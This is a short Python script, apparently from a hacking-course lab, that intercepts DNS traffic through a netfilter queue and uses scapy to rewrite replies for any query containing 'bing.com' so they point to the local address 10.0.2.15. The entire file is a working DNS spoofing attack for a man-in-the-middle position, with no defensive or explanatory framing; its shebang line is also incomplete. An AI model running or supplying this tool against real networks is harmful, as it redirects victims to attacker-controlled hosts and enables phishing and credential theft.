#!/usr/bin/env

from netfilterqueue import NetfilterQueue
import scapy.all as scapy

def print_and_accept(pkt):
    scapy_packet = scapy.IP(pkt.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "bing.com" in str(qname): 
            print("[+] spoofing target")
            answer = scapy.DNSRR(rrname=qname,rdata="10.0.2.15")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len 
            del scapy_packet[scapy.IP].chksum 
            del scapy_packet[scapy.UDP].len 
            del scapy_packet[scapy.UDP].chksum 
            print(scapy_packet.show())
            pkt.set_payload(bytes(scapy_packet))
    pkt.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_accept)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('something went wrong')

nfqueue.unbind()
